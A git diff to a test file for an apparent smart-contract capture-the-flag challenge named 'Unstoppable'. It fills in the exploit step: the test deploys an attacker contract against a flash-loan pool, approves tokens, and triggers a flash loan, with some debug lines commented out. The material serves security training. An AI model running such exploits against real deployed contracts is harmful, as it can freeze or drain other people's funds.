@@ -40,6 +40,24 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // console.log(attacker.address)
+        // let bal = await this.token.balanceOf(attacker.address);
+        // console.log(parseInt(bal._hex, 16))
+        
+        let token = await this.token.connect(attacker)
+        let pool = await this.pool.connect(attacker)
+        // let bal = await this.token.balanceOf(pool.address);
+        // console.log(parseInt(bal._hex, 16))
+
+        const AttackerUnstoppable = await ethers.getContractFactory('AttackerUnstoppable', attacker);
+        attackerContract = await AttackerUnstoppable.deploy(this.pool.address);
+        await token.approve(attackerContract.address, TOKENS_IN_POOL);
+        // let allowance = await token.allowance(attacker.address, attackerContract.address);
+        // console.log(parseInt(allowance._hex, 16))
+        await attackerContract.executeFlashLoan(INITIAL_ATTACKER_TOKEN_BALANCE);
+
+        // console.log(c)
+
     });
 
     after(async function () {
